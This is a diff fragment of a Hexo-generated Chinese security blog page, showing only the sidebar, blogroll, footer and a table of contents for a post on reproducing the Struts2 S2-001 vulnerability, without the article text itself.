+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/posts/a53b1765.html" rel="next" title="CsdecryptBeacon"><span class="nav-title">CsdecryptBeacon</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/avatar.jpg" alt="Kuiba">
+  
+  <h1 class="author-name">Kuiba</h1>
+  <h2 class="author-description">这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。</h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">37</a></div>
+    </div>
+    
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">36</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#S2-001漏洞复现"><span class="toc-text">S2-001漏洞复现</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#漏洞详情"><span class="toc-text">漏洞详情</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#复现attack"><span class="toc-text">复现attack</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    <hr>
+    <div class="social-link sidebar-item">
+      <div><i class="far fa-address-card"></i>社交链接</p></div>
+      <ul>
+        
+        <li><i class="fas fa-envelope"></i><a href="mailto:a3VpYmFoZEBmb3htYWlsLmNvbQ" target="_blank">E-Mail</a></li>
+        
+        <li><i class="fab fa-github"></i><a href="https://github.com/" target="_blank">GitHub</a></li>
+        
+        <li><i class="fab fa-weibo"></i><a href="https://weibo.com/" target="_blank">Weibo</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>大佬们的博客</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.ggsec.cn/" target="_blank">Demon</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://payloads.online/" target="_blank">倾旋</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://wbglil.github.io/" target="_blank">WBGlIl(装小白的巨佬)</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.sariel.top/" target="_blank">只因不值得</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://uknowsec.cn/" target="_blank">Uknowse</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://422926799.github.io/" target="_blank">九世</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://yulige.top/" target="_blank">郁离歌</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://phpinfo.me/" target="_blank">Lcy</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://867810770.github.io/" target="_blank">修心</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://vinc.top/" target="_blank">Vimc</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://qimingyu.com/" target="_blank">qimingyu</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://x.hacking8.com/" target="_blank">小草窝</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://yiwlny.github.io/" target="_blank">Rogerd</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://loulan-ling.github.io/" target="_blank">楼兰-翎师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://manmachines.github.io/" target="_blank">菜师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://whale3070.github.io/" target="_blank">whale3070</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.cnblogs.com/Secde0/" target="_blank">Secde0</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Kuiba</span><span class="year"><i class="far fa-copyright"></i>2018 - 2021</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">BY-NC-SA 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          本站托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.xyz/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
